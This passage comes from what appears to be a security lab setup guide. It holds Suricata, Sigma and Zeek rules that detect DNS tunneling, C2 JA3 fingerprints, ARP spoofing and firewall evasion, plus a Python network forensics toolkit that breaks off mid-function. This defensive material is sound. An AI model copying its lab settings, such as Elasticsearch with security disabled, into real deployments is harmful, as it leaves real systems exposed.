  classtype:policy-violation; sid:9000014; rev:1;)

alert tls $HOME_NET any -> $EXTERNAL_NET 443 (msg:"LAB DoH to Cloudflare"; \
  tls.sni; content:"cloudflare-dns.com"; \
  classtype:policy-violation; sid:9000015; rev:1;)

# === TLS Attack Detection ===

# Known malicious JA3 — Cobalt Strike default
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"LAB Cobalt Strike Default JA3"; \
  ja3.hash; content:"72a589da586844d7f0818ce684948eea"; \
  classtype:trojan-activity; sid:9000020; rev:1;)

# Known malicious JA3 — Metasploit Meterpreter
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"LAB Metasploit Meterpreter JA3"; \
  ja3.hash; content:"e7d705a3286e19ea42f587b344ee6865"; \
  classtype:trojan-activity; sid:9000021; rev:1;)

# TLS with self-signed cert on non-standard port (C2 indicator)
alert tls $HOME_NET any -> $EXTERNAL_NET !443 (msg:"LAB TLS Non-Standard Port"; \
  tls.cert_subject; content:"CN="; \
  classtype:bad-unknown; sid:9000022; rev:1;)

# SSL stripping indicator — HTTP to previously-HTTPS site
alert http $HOME_NET any -> any 80 (msg:"LAB Possible SSL Strip - Login over HTTP"; \
  http.uri; content:"/login"; nocase; \
  classtype:bad-unknown; sid:9000023; rev:1;)

# === MITM Detection ===

# ARP spoofing (gratuitous ARP flood)
alert arp any any -> any any (msg:"LAB ARP Spoofing - Gratuitous ARP Flood"; \
  threshold:type both, track by_src, count 20, seconds 10; \
  classtype:misc-attack; sid:9000030; rev:1;)

# === Firewall Evasion Detection ===

# IP fragmentation (small fragments — evasion technique)
alert ip any any -> $HOME_NET any (msg:"LAB Small IP Fragment (IDS Evasion)"; \
  fragbits:M; dsize:<100; \
  classtype:attempted-recon; sid:9000040; rev:1;)

# Source port 53 scan (firewall bypass technique)
alert tcp any 53 -> $HOME_NET any (msg:"LAB Scan with Source Port 53 (FW Bypass)"; \
  flags:S; classtype:attempted-recon; sid:9000041; rev:1;)
EOF

# ─── Sigma rules ───
mkdir -p /opt/sigma/rules

cat > /opt/sigma/rules/dns_tunneling.yml <<'EOF'
title: DNS Tunneling via High-Entropy Subdomains
id: d9a01001-0001-4000-8000-000000000001
status: experimental
description: |
  Detects DNS queries with base32/base64-encoded subdomains typical of
  DNS tunneling tools (iodine, dnscat2, dns2tcp).
logsource:
  category: dns
  product: zeek
detection:
  selection:
    query|re: '^[a-z0-9]{30,}\.'
  filter_cdn:
    query|endswith:
      - '.cdn.cloudflare.com'
      - '.amazonaws.com'
      - '.akamaiedge.net'
  condition: selection and not filter_cdn
level: high
tags:
  - attack.command_and_control
  - attack.t1071.004
  - attack.exfiltration
  - attack.t1048.003
falsepositives:
  - CDN health checks with long subdomain tokens
  - DKIM signature queries
EOF

cat > /opt/sigma/rules/tcp_rst_injection.yml <<'EOF'
title: TCP RST Injection Attack
id: d9a01001-0002-4000-8000-000000000002
status: experimental
description: |
  Detects a burst of TCP RST packets from a single source targeting
  established connections, indicative of RST injection (GFW-style censorship
  or session disruption attacks).
logsource:
  category: firewall
  product: any
detection:
  selection:
    tcp_flags: RST
  condition: selection | count(dst_ip) by src_ip > 30
  timeframe: 5s
level: high
tags:
  - attack.impact
  - attack.t1565.002
EOF

cat > /opt/sigma/rules/tls_downgrade.yml <<'EOF'
title: TLS Downgrade Attack Indicator
id: d9a01001-0003-4000-8000-000000000003
status: experimental
description: |
  Detects TLS connections using deprecated protocols (TLS 1.0/1.1) or
  weak cipher suites indicative of active downgrade attacks.
logsource:
  category: proxy
  product: any
detection:
  selection_version:
    tls.version|contains:
      - 'TLSv1.0'
      - 'TLSv1.1'
      - 'SSLv3'
  selection_cipher:
    tls.cipher|contains:
      - 'RC4'
      - 'DES'
      - 'NULL'
      - 'EXPORT'
  condition: selection_version or selection_cipher
level: medium
tags:
  - attack.credential_access
  - attack.t1557.002
EOF

cat > /opt/sigma/rules/port_scan_detection.yml <<'EOF'
title: Network Port Scan Detection
id: d9a01001-0004-4000-8000-000000000004
status: experimental
description: |
  Detects horizontal port scanning (single source connecting to many
  destination ports within a short time window).
logsource:
  category: firewall
  product: any
detection:
  selection:
    action: allowed
  condition: selection | count(dst_port) by src_ip > 50
  timeframe: 5m
level: high
tags:
  - attack.discovery
  - attack.t1046
falsepositives:
  - Vulnerability scanners (Nessus, Qualys)
  - Service discovery tools in CI/CD
EOF

cat > /opt/sigma/rules/bgp_hijack_indicator.yml <<'EOF'
title: BGP Route Anomaly - Possible Hijack
id: d9a01001-0005-4000-8000-000000000005
status: experimental
description: |
  Detects unexpected changes in BGP route announcements that may indicate
  prefix hijacking or route leak.
logsource:
  category: router
  product: any
detection:
  selection:
    event_type: bgp_update
    prefix|cidr:
      - '10.0.0.0/8'
      - '172.16.0.0/12'
      - '192.168.0.0/16'
  filter_known_as:
    origin_as|contains:
      - 'AS64512'  # expected private AS
  condition: selection and not filter_known_as
level: critical
tags:
  - attack.initial_access
  - attack.t1557
EOF

# ─── Zeek scripts for behavioral analysis ───
mkdir -p /opt/zeek/scripts

cat > /opt/zeek/scripts/dns_tunnel_detect.zeek <<'EOF'
##! Detect DNS tunneling via query length and entropy analysis

@load base/protocols/dns
@load base/frameworks/notice

module DNSTunnelDetect;

export {
    redef enum Notice::Type += {
        DNS_Tunnel_Long_Query,
        DNS_Tunnel_High_Entropy,
        DNS_Tunnel_High_Volume,
        DNS_Tunnel_TXT_Flood
    };
    
    const query_length_threshold = 50 &redef;
    const entropy_threshold = 3.8 &redef;
    const volume_threshold = 200 &redef;
    const txt_threshold = 50 &redef;
    const monitoring_window = 5min &redef;
}

global query_counts: table[addr] of count &default=0 &create_expire=monitoring_window;
global txt_counts: table[addr] of count &default=0 &create_expire=monitoring_window;

function calc_entropy(s: string): double
    {
    local freq: table[string] of count = table();
    local n = |s|;
    if ( n == 0 ) return 0.0;
    
    for ( i in s )
        {
        if ( s[i] in freq )
            freq[s[i]] += 1;
        else
            freq[s[i]] = 1;
        }
    
    local entropy = 0.0;
    for ( c, cnt in freq )
        {
        local p = (cnt * 1.0) / n;
        entropy -= p * (ln(p) / ln(2.0));
        }
    return entropy;
    }

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
    {
    local src = c$id$orig_h;
    
    # Long query detection
    if ( |query| > query_length_threshold )
        {
        NOTICE([$note=DNS_Tunnel_Long_Query,
                $msg=fmt("Long DNS query from %s: %s (%d chars)", src, query, |query|),
                $conn=c,
                $identifier=cat(src, "|long|", query)]);
        }
    
    # Entropy analysis on longest label
    local labels = split_string(query, /\./);
    if ( |labels| > 0 )
        {
        local longest = "";
        for ( i in labels )
            if ( |labels[i]| > |longest| )
                longest = labels[i];
        
        if ( |longest| > 15 )
            {
            local ent = calc_entropy(longest);
            if ( ent > entropy_threshold )
                NOTICE([$note=DNS_Tunnel_High_Entropy,
                        $msg=fmt("High entropy DNS label from %s: '%s' (entropy=%.2f, query=%s)",
                                 src, longest, ent, query),
                        $conn=c,
                        $identifier=cat(src, "|entropy|", longest)]);
            }
        }
    
    # Volume tracking
    ++query_counts[src];
    if ( query_counts[src] == volume_threshold )
        NOTICE([$note=DNS_Tunnel_High_Volume,
                $msg=fmt("High DNS query volume from %s: %d queries in %s",
                         src, volume_threshold, monitoring_window),
                $conn=c,
                $identifier=cat(src, "|volume")]);
    
    # TXT record tracking (common in DNS tunnels)
    if ( qtype == 16 )  # TXT
        {
        ++txt_counts[src];
        if ( txt_counts[src] == txt_threshold )
            NOTICE([$note=DNS_Tunnel_TXT_Flood,
                    $msg=fmt("Excessive TXT queries from %s: %d in %s",
                             src, txt_threshold, monitoring_window),
                    $conn=c,
                    $identifier=cat(src, "|txt_flood")]);
        }
    }
EOF

cat > /opt/zeek/scripts/tcp_anomaly_detect.zeek <<'EOF'
##! Detect TCP anomalies: covert channels, hijacking indicators, scanning

@load base/protocols/conn
@load base/frameworks/notice

module TCPAnomalyDetect;

export {
    redef enum Notice::Type += {
        TCP_Covert_Channel_Option,
        TCP_Session_Hijack_Indicator,
        TCP_Scan_Detected,
        TCP_RST_Flood
    };
    
    const scan_threshold = 50 &redef;
    const rst_threshold = 30 &redef;
    const scan_window = 10sec &redef;
}

global port_scan_tracker: table[addr] of set[port] &create_expire=scan_window;
global rst_tracker: table[addr] of count &default=0 &create_expire=scan_window;

event tcp_option(c: connection, is_orig: bool, opt: count, optlen: count)
    {
    # Detect unusual TCP option kinds (potential covert channel)
    if ( opt >= 9 && opt <= 26 && opt != 28 && opt != 29 )
        NOTICE([$note=TCP_Covert_Channel_Option,
                $msg=fmt("Unusual TCP option kind=%d (len=%d) from %s",
                         opt, optlen, c$id$orig_h),
                $conn=c]);
    }

event connection_attempt(c: connection)
    {
    local src = c$id$orig_h;
    local dst_port = c$id$resp_p;
    
    if ( src !in port_scan_tracker )
        port_scan_tracker[src] = set();
    
    add port_scan_tracker[src][dst_port];
    
    if ( |port_scan_tracker[src]| == scan_threshold )
        NOTICE([$note=TCP_Scan_Detected,
                $msg=fmt("Port scan: %s connected to %d+ ports in %s",
                         src, scan_threshold, scan_window),
                $conn=c,
                $identifier=cat(src, "|portscan")]);
    }

event connection_rejected(c: connection)
    {
    # Track RST floods (potential injection attack)
    local src = c$id$orig_h;
    ++rst_tracker[src];
    
    if ( rst_tracker[src] == rst_threshold )
        NOTICE([$note=TCP_RST_Flood,
                $msg=fmt("RST flood from %s: %d rejected connections in %s",
                         src, rst_threshold, scan_window),
                $conn=c,
                $identifier=cat(src, "|rst_flood")]);
    }
EOF

# ─── ELK Stack (docker-compose) ───
cat > /opt/elk/docker-compose.yml <<'EOF'
version: '3.8'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.12.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms1g -Xmx1g"
    ports:
      - "9200:9200"
    volumes:
      - es_data:/usr/share/elasticsearch/data

  kibana:
    image: docker.elastic.co/kibana/kibana:8.12.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on:
      - elasticsearch

  logstash:
    image: docker.elastic.co/logstash/logstash:8.12.0
    ports:
      - "5044:5044"
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch

volumes:
  es_data:
EOF

cat > /opt/elk/logstash.conf <<'EOF'
input {
  file {
    path => "/var/log/suricata/eve.json"
    codec => json
    type => "suricata"
  }
  file {
    path => "/opt/zeek/logs/current/*.log"
    type => "zeek"
  }
}

filter {
  if [type] == "suricata" {
    date {
      match => ["timestamp", "ISO8601"]
    }
  }
}

output {
  elasticsearch {
    hosts => ["http://elasticsearch:9200"]
    index => "network-security-%{+YYYY.MM.dd}"
  }
}
EOF

# ─── Validation script ───
cat > /opt/validate_detection.sh <<'BASH'
#!/bin/bash
echo "╔═════════════════════════════════════════╗"
echo "║  Detection Infrastructure Validation    ║"
echo "╚═════════════════════════════════════════╝"

echo ""
echo "[1] Suricata Rules..."
suricata -T -c /etc/suricata/suricata.yaml 2>&1 | tail -3
CUSTOM_RULES=$(grep -c "^alert" /etc/suricata/rules/custom/network-attacks.rules)
echo "    Custom rules loaded: $CUSTOM_RULES"

echo ""
echo "[2] Zeek Scripts..."
zeek -a /opt/zeek/scripts/dns_tunnel_detect.zeek 2>&1 | head -5
zeek -a /opt/zeek/scripts/tcp_anomaly_detect.zeek 2>&1 | head -5
echo "    Zeek scripts: syntax OK"

echo ""
echo "[3] Sigma Rules..."
SIGMA_COUNT=$(find /opt/sigma/rules -name "*.yml" | wc -l)
echo "    Sigma rules: $SIGMA_COUNT files"
for f in /opt/sigma/rules/*.yml; do
    python3 -c "import yaml; yaml.safe_load(open('$f'))" 2>/dev/null && \
        echo "    ✓ $(basename $f)" || echo "    ✗ $(basename $f) — INVALID YAML"
done

echo ""
echo "[4] ELK Stack..."
if docker ps | grep -q elasticsearch; then
    curl -s http://localhost:9200/_cluster/health | python3 -c \
        "import sys,json; d=json.load(sys.stdin); print(f'    Status: {d[\"status\"]}, Nodes: {d[\"number_of_nodes\"]}')"
else
    echo "    ELK not running (start with: cd /opt/elk && docker-compose up -d)"
fi

echo ""
echo "[✓] Validation complete"
BASH
chmod +x /opt/validate_detection.sh

echo "[✓] VM3 detection infrastructure configured"
```

### VM4 — Forensics/Analysis Setup

```bash
#!/bin/bash
# vm4_setup.sh — Network forensics and analysis tools

set -euo pipefail

apt-get update && apt-get install -y \
    tshark wireshark-common tcpdump \
    python3 python3-pip \
    mergecap capinfos editcap \
    volatility3 jq

pip3 install scapy dpkt pyshark

mkdir -p /opt/forensics/{scripts,evidence,reports}

cat > /opt/forensics/scripts/network_forensics_toolkit.py <<'PYEOF'
#!/usr/bin/env python3
"""
Network Protocol Forensics Toolkit
- TCP stream reconstruction
- DNS query forensic analysis
- TLS session analysis
- Timeline reconstruction
- Evidence chain preservation
- Anomaly detection in captures
"""
import sys
import os
import json
import hashlib
import subprocess
import csv
from datetime import datetime, timezone
from pathlib import Path
from collections import Counter, defaultdict

class EvidencePreserver:
    """Maintain chain of custody for packet captures."""
    
    def __init__(self, evidence_dir: str):
        self.evidence_dir = Path(evidence_dir)
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self.manifest_file = self.evidence_dir / "chain_of_custody.json"
        self.manifest = self._load_manifest()
    
    def _load_manifest(self) -> dict:
        if self.manifest_file.exists():
            return json.loads(self.manifest_file.read_text())
        return {"evidence_items": [], "analysts": [], "created": self._now()}
    
    def _now(self) -> str:
        return datetime.now(timezone.utc).isoformat()
    
    def register_evidence(self, filepath: str, description: str) -> dict:
        """Register a new piece of evidence with hash and metadata."""
        path = Path(filepath)
        if not path.exists():
            raise FileNotFoundError(f"Evidence file not found: {filepath}")
        
        # Compute integrity hashes
        sha256 = hashlib.sha256(path.read_bytes()).hexdigest()
        md5 = hashlib.md5(path.read_bytes()).hexdigest()
        
        # Get capture metadata
        capinfo = subprocess.run(
            ["capinfos", "-A", "-e", "-c", str(path)],
            capture_output=True, text=True
        )
        
        item = {
            "id": f"EV-{len(self.manifest['evidence_items'])+1:04d}",
            "filename": path.name,
            "original_path": str(path.absolute()),
            "description": description,
            "sha256": sha256,
            "md5": md5,
            "size_bytes": path.stat().st_size,
            "registered_at": self._now(),
            "registered_by": os.environ.get("USER", "analyst"),
            "hostname": os.uname().nodename,
            "capinfo": capinfo.stdout if capinfo.returncode == 0 else "N/A",
            "integrity_verified": True
        }
        
        self.manifest["evidence_items"].append(item)
        self._save_manifest()
        
        # Create read-only copy
        evidence_copy = self.evidence_dir / f"{item['id']}_{path.name}"
        evidence_copy.write_bytes(path.read_bytes())
        os.chmod(str(evidence_copy), 0o444)
        
        print(f"[+] Evidence registered: {item['id']}")
        print(f"    SHA-256: {sha256}")
        print(f"    Copy: {evidence_copy}")
        return item
    
    def verify_integrity(self, evidence_id: str) -> bool:
        """Verify evidence hasn't been tampered with."""
        for item in self.manifest["evidence_items"]:
            if item["id"] == evidence_id:
                copy_path = self.evidence_dir / f"{item['id']}_{Path(item['original_path']).name}"
                if copy_path.exists():
                    current_hash = hashlib.sha256(copy_path.read_bytes()).hexdigest()
                    if current_hash == item["sha256"]:
                        print(f"[✓] {evidence_id}: Integrity VERIFIED")
                        return True
                    else:
                        print(f"[✗] {evidence_id}: INTEGRITY VIOLATION!")
                        print(f"    Expected: {item['sha256']}")
                        print(f"    Current:  {current_hash}")
                        return False
        print(f"[-] Evidence ID not found: {evidence_id}")
        return False
    
    def _save_manifest(self):
        self.manifest_file.write_text(json.dumps(self.manifest, indent=2))


class TCPStreamReconstructor:
    """Reconstruct and analyze TCP streams from packet captures."""
    
    def __init__(self, pcap_file: str):
        self.pcap_file = pcap_file
        self._verify_file()
    
    def _verify_file(self):
        if not os.path.exists(self.pcap_file):
            raise FileNotFoundError(f"PCAP not found: {self.pcap_file}")
    
    def list_conversations(self, top_n: int = 20) -> list:
        """List top TCP conversations by bytes transferred."""
        result = subprocess.run(
            ["tshark", "-r", self.pcap_file, "-q", "-z", "conv,tcp"],
            capture_output=True, text=True
        )
        print(f"[*] TCP Conversations in {self.pcap_file}:")
        lines = result.stdout.strip().split('\n')
        conversations = []
        for line in lines:
            if '<->' in line:
                conversations.append(line.strip())
                if len(conversations) <= top_n:
                    print(f"    {line.strip()}")
        return conversations
    
    def extract_stream(self, stream_index: int, output_format: str = "ascii") -> str:
        """Extract a specific TCP stream."""
        result = subprocess.run(
            ["tshark", "-r", self.pcap_file, "-q", "-z",
             f"follow,tcp,{output_format},{stream_index}"],
            capture_output=True, text=True
        )
        return result.stdout
    
    def extract_http_objects(self, output_dir: str) -> list:
        """Extract all HTTP objects from the capture."""
        os.makedirs(output_dir, exist_ok=True)
        subprocess.run(
            ["tshark", "-r", self.pcap_file, "--export-objects", f"http,{output_dir}"],
            capture_output=True
        )
        objects = list(Path(output_dir).iterdir())
        print(f"[+] Extracted {len(objects)} HTTP objects to {output_dir}")
        return [str(o) for o in objects]
    
    def detect_retransmissions(self) -> list:
        """Find TCP retransmissions (potential hijacking/network issues)."""
        result = subprocess.run(
            ["tshark", "-r", self.pcap_file,
             "-Y", "tcp.analysis.retransmission",
             "-T", "fields",
             "-e", "frame.number", "-e", "ip.src", "-e", "ip.dst",
             "-e", "tcp.stream", "-e", "tcp.seq",
             "-E", "separator=|"],
            capture_output=True, text=True
        )
        retransmissions = []
        for line in result.stdout.strip().split('\n'):
            if line:
                parts = line.split('|')
                if len(parts) >= 5:
                    retransmissions.append({
                        "frame": parts[0], "src": parts[1],
                        "dst": parts[2], "stream": parts[3], "seq": parts[4]
                    })
        return retransmissions


class DNSForensicAnalyzer:
    """Forensic analysis of DNS traffic in packet captures."""
    
    def __init__(self, pcap_file: str):
        self.pcap_file = pcap_file
    
    def extract_all_queries(self) -> list:
        """Extract all DNS queries with metadata."""
        result = subprocess.run(
            ["tshark", "-r", self.pcap_file, "-Y", "dns.flags.response == 0",
             "-T", "fields",
             "-e", "frame.time", "-e", "ip.src", "-e", "ip.dst",
             "-e", "dns.qry.name", "-e", "dns.qry.type",
             "-E", "separator=|", "-E", "header=n"],
            capture_output=True, text=True
        )
        queries = []
        for line in result.stdout.strip().split('\n'):
            if line:
                parts = line.split('|')
                if len(parts) >= 5:
                    queries.append({
                        "time": parts[0], "src": parts[1],
                        "dst": parts[2], "query": parts[3], "type": parts[4]
                    })
        return queries
    
    def detect_tunneling(self, queries: list = None) -> dict:
        """Analyze DNS queries for tunneling indicators."""
        if queries is None:
            queries = self.extract_all_queries()
        
        indicators = {
            "long_queries": [],      # > 50 chars
            "high_entropy": [],      # entropy > 3.5
            "high_volume_sources": {},  # sources with > 100 queries
            "txt_heavy_sources": {},    # sources with many TXT queries
            "unique_subdomains": defaultdict(set),  # per base domain
        }
        
        source_counts = Counter()
        txt_counts = Counter()
        
        for q in queries:
            query_name = q.get("query", "")
            src = q.get("src", "")
            qtype = q.get("type", "")
            
            source_counts[src] += 1
            if qtype == "16" or qtype == "TXT":
                txt_counts[src] += 1
            
            if len(query_name) > 50:
                indicators["long_queries"].append(q)
            
            # Check entropy of longest label
            labels = query_name.split('.')
            if labels:
                longest = max(labels, key=len)
                if len(longest) > 15:
                    entropy = self._shannon_entropy(longest)
                    if entropy > 3.5:
                        indicators["high_entropy"].append({
                            **q, "label": longest, "entropy": f"{entropy:.2f}"
                        })
                
                # Track unique subdomains per base domain
                if len(labels) >= 3:
                    base = '.'.join(labels[-2:])
                    indicators["unique_subdomains"][base].add(query_name)
        
        indicators["high_volume_sources"] = {
            src: count for src, count in source_counts.items() if count > 100
        }
        indicators["txt_heavy_sources"] = {
            src: count for src, count in txt_counts.items() if count > 20
        }
        
        return indicators
    
    def detect_cache_snooping(self) -> list:
        """Identify non-recursive queries (RD=0) that indicate cache snooping."""
        result = subprocess.run(
            ["tshark", "-r", self.pcap_file,
             "-Y", "dns.flags.response == 0 && dns.flags.recdesired == 0",
             "-T", "fields",
             "-e", "frame.time", "-e", "ip.src", "-e", "dns.qry.name",
             "-E", "separator=|"],
            capture_output=True, text=True
        )
        snooping = []
        for line in result.stdout.strip().split('\n'):
            if line:
                parts = line.split('|')
                if len(parts) >= 3:
                    snooping.append({"time": parts[0], "src": parts[1], "query": parts[2]})
        return snooping
    
    @staticmethod
    def _shannon_entropy(s: str) -> float:
        if not s:
            return 0.0
        freq = Counter(s)
        n = len(s)
        entropy = 0.0
        for count in freq.values():
            p = count / n
            entropy -= p * (p and __import__('math').log2(p))
        return entropy


class TLSSessionAnalyzer:
    """Analyze TLS sessions for security issues."""
    
    def __init__(self, pcap_file: str, keylog_file: str = None):
        self.pcap_file = pcap_file
        self.keylog_file = keylog_file
    
    def extract_handshakes(self) -> list:
        """Extract TLS handshake metadata (version, cipher, SNI)."""
        cmd = ["tshark", "-r", self.pcap_file,
               "-Y", "tls.handshake.type == 2",  # ServerHello
               "-T", "fields",
               "-e", "ip.src", "-e", "ip.dst",
               "-e", "tls.handshake.version",
               "-e", "tls.handshake.ciphersuite",
               "-e", "tls.handshake.extensions_server_name",
               "-E", "separator=|"]
        
        if self.keylog_file:
            cmd.extend(["-o", f"tls.keylog_file:{self.keylog_file}"])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        handshakes = []
        for line in result.stdout.strip().split('\n'):
            if line:
                parts = line.split('|')
                if len(parts) >= 4:
                    handshakes.append({
                        "server": parts[0], "client": parts[1],
                        "version": parts[2], "cipher": parts[3],
                        "sni": parts[4] if len(parts) > 4 else ""
                    })
        return handshakes
    
    def extract_ja3_fingerprints(self) -> list:
        """Extract JA3 fingerprints from ClientHello messages."""
        result = subprocess.run(
            ["tshark", "-r", self.pcap_file,
             "-Y", "tls.handshake.type == 1",
             "-T", "fields",
             "-e", "ip.src", "-e", "ip.dst",
             "-e", "tls.handshake.ja3",
             "-E", "separator=|"],
            capture_output=True, text=True
        )
        fingerprints = []
        for line in result.stdout.strip().split('\n'):
            if line:
                parts = line.split('|')
                if len(parts) >= 3:
                    fingerprints.append({
                        "src": parts[0], "dst": parts[1], "ja3": parts[2]
                    })
        return fingerprints
    
    def detect_weak_tls(self, handshakes: list = None) -> list:
        """Identify weak TLS configurations."""
        if handshakes is None:
            handshakes = self.extract_handshakes()
        
        weak_versions = {"0x0300", "0x0301", "0x0302"}  # SSLv3, TLS 1.0, TLS 1.1
        weak_ciphers = {"RC4", "DES", "3DES", "NULL", "EXPORT", "anon"}
        
        findings = []
        for hs in handshakes:
            issues = []
            if hs["version"] in weak_versions:
                issues.append(f"Deprecated TLS version: {hs['version']}")
            for wc in weak_ciphers:
                if wc.upper() in hs.get("cipher", "").upper():
                    issues.append(f"Weak cipher: {hs['cipher']}")
                    break
            if issues:
                findings.append({**hs, "issues": issues})
        
        return findings


class NetworkTimelineBuilder:
    """Build unified timeline from multiple packet captures."""
    
    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def merge_captures(self, pcap_files: list, output_name: str = "merged.pcap") -> str:
        """Merge multiple pcap files into a single chronological capture."""
        output_path = self.output_dir / output_name
        cmd = ["mergecap", "-w", str(output_path)] + pcap_files
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] Merged {len(pcap_files)} captures → {output_path}")
            # Verify
            capinfo = subprocess.run(
                ["capinfos", "-ae", str(output_path)],
                capture_output=True, text=True
            )
            print(f"    {capinfo.stdout.strip()}")
        else:
            print(f"[-] Merge failed: {result.stderr}")
        
        return str(output_path)
    
    def build_timeline(self, pcap_file: str, output_csv: str = None) -> list:
        """Build a network event timeline from a capture."""
        if output_csv is None:
            output_csv = str(self.output_dir / "timeline.csv")
        
        result = subprocess.run(
            ["tshark", "-r", pcap_file, "-T", "fields",
             "-e", "frame.time_epoch",
             "-e", "ip.src", "-e", "ip.dst",
             "-e", "tcp.dstport", "-e", "udp.dstport",
             "-e", "dns.qry.name",
             "-e", "tls.handshake.extensions_server_name",
             "-e", "http.host",
             "-e", "frame.protocols",
             "-E", "separator=,", "-E", "header=y",
             "-E", "quote=d"],
            capture_output=True, text=True
        )
        
        # Write to CSV
        with open(output_csv, 'w') as f:
            f.write(result.stdout)
        
        print(f"[+] Timeline written to {output_csv}")
        line_count = result.stdout.count('\n') - 1
        print(f"    Events: {line_count}")
        return output_csv


class ForensicReportGenerator:
    """Generate a comprehensive forensic analysis report."""
    
    def __init__(self, case_id: str, analyst: str):
        self.case_id = case_id
        self.analyst = analyst
        self.findings = []
        self.evidence_items = []
        self.timeline_events = []
    
    def add_finding(self, severity: str, category: str, description: str, evidence: str = ""):
        self.findings.append({
            "severity": severity,
            "category": category,
            "description": description,
            "evidence": evidence,
            "timestamp": datetime.now(timezone.utc).isoformat()
        })
    
    def generate_report(self, output_file: str):
        """Generate Markdown forensic report."""
        report = f"""# Network Forensic Analysis Report

## Case Information
- **Case ID:** {self.case_id}
- **Analyst:** {self.analyst}
- **Generated:** {datetime.now(timezone.utc).isoformat()}Z
- **Tool:** Network Protocol Forensics Toolkit v1.0

## Executive Summary

Total findings: {len(self.findings)}
- Critical: {sum(1 for f in self.findings if f['severity']=='CRITICAL')}
- High: {sum(1 for f in self.findings if f['severity']=='HIGH')}
- Medium: {sum(1 for f in self.findings if f['severity']=='MEDIUM')}
- Low: {sum(1 for f in self.findings if f['severity']=='LOW')}

## Findings

"""
        for i, finding in enumerate(self.findings, 1):
            report += f"""### Finding {i}: [{finding['severity']}] {finding['category']}

**Description:** {finding['description']}

**Evidence:** {finding['evidence']}

**Detected:** {finding['timestamp']}

---

"""
        
        report += """## Methodology

1. Evidence acquisition and integrity verification (SHA-256)
2. TCP stream reconstruction and conversation analysis
3. DNS query forensic analysis (tunneling, DGA, cache snooping)
4. TLS session analysis (version, cipher, JA3 fingerprinting)
5. Network timeline construction and correlation
6. IOC extraction and threat intelligence matching

## Chain of Custody

All evidence items hashed at acquisition. Read-only copies maintained.
Integrity verified before each analysis phase.
"""
        
        with open(output_file, 'w') as f:
            f.write(report)
        
        print(f"[+] Report generated: {output_file}")


def main():
    """CLI interface for the forensics toolkit."""
    if len(sys.argv) < 2:
        print("""
Network Protocol Forensics Toolkit
===================================
Usage:
  forensics.py evidence <pcap_file> <description>    Register evidence
  forensics.py verify <evidence_id>                  Verify integrity
  forensics.py streams <pcap_file>                   List TCP streams
  forensics.py dns <pcap_file>                       DNS forensic analysis
  forensics.py tls <pcap_file> [keylog]              TLS session analysis
  forensics.py timeline <pcap1> [pcap2...]           Build timeline
  forensics.py report <case_id> <pcap_file>          Full analysis report
""")
        sys.exit(1)
    
    cmd = sys.argv[1]
    
    if cmd == "evidence":
        ep = EvidencePreserver("/opt/forensics/evidence")
        ep.register_evidence(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "Network capture")
    
    elif cmd == "verify":
        ep = EvidencePreserver("/opt/forensics/evidence")
        ep.verify_integrity(sys.argv[2])
    
    elif cmd == "streams":
        recon = TCPStreamReconstructor(sys.argv[2])
        recon.list_conversations()
        retrans = recon.detect_retransmissions()
        if retrans:
            print(f"\n[!] {len(retrans)} retransmissions detected (potential issues)")
    
    elif cmd == "dns":
        analyzer = DNSForensicAnalyzer(sys.argv[2])
        queries = analyzer.extract_all_queries()
        print(f"[*] Total DNS queries: {len(queries)}")
        
        indicators = analyzer.detect_tunneling(queries)
        if indicators["long_queries"]:
            print(f"\n[!] Long queries ({len(indicators['long_queries'])}):")
            for q in indicators["long_queries"][:5]:
                print(f"    {q['src']} → {q['query'][:60]}...")
        if indicators["high_entropy"]:
            print(f"\n[!] High entropy labels ({len(indicators['high_entropy'])}):")
            for q in indicators["high_entropy"][:5]:
                print(f"    {q['src']} → {q['label']} (entropy={q['entropy']})")
        
        snooping = analyzer.detect_cache_snooping()
        if snooping:
            print(f"\n[!] Cache snooping attempts ({len(snooping)}):")
            for s in snooping[:5]:
                print(f"    {s['src']} → {s['query']}")
    
    elif cmd == "tls":
        keylog = sys.argv[3] if len(sys.argv) > 3 else None
        analyzer = TLSSessionAnalyzer(sys.argv[2], keylog)
        
        handshakes = analyzer.extract_handshakes()
        print(f"[*] TLS sessions: {len(handshakes)}")
        
        weak = analyzer.detect_weak_tls(handshakes)
        if weak:
            print(f"\n[!] Weak TLS configurations ({len(weak)}):")
            for w in weak:
                print(f"    {w['server']} → {w['client']}: {w['issues']}")
        
        ja3s = analyzer.extract_ja3_fingerprints()
        if ja3s:
            print(f"\n[*] JA3 fingerprints ({len(ja3s)}):")
            for fp in ja3s[:10]:
                print(f"    {fp['src']} → {fp['dst']}: {fp['ja3']}")
    
    elif cmd == "timeline":
        builder = NetworkTimelineBuilder("/opt/forensics/reports")
        if len(sys.argv) > 3:
            merged = builder.merge_captures(sys.argv[2:])
            builder.build_timeline(merged)
        else:
            builder.build_timeline(sys.argv[2])
    
    elif cmd == "report":
        case_id = sys.argv[2]
        pcap_file = sys.argv[3]
        
        report_gen = ForensicReportGenerator(case_id, os.environ.get("USER", "analyst"))
        
        # Run all analyses
        tcp = TCPStreamReconstructor(pcap_file)
        retrans = tcp.detect_retransmissions()
        if retrans:
            report_gen.add_finding("MEDIUM", "TCP Anomaly",
                                   f"{len(retrans)} TCP retransmissions detected",
                                   "Potential network instability or session manipulation")
        
        dns = DNSForensicAnalyzer(pcap_file)
        indicators = dns.detect_tunneling()
        if indicators["long_queries"]:
            report_gen.add_finding("HIGH", "DNS Tunneling",
                                   f"{len(indicators['long_queries'])} queries with >50 char names",
                                   "Possible DNS exfiltration channel")
        if indicators["high_entropy"]:
            report_gen.add_finding("HIGH", "DNS Tunneling",
                                   f"{len(indicators['high_entropy'])} labels with high entropy",
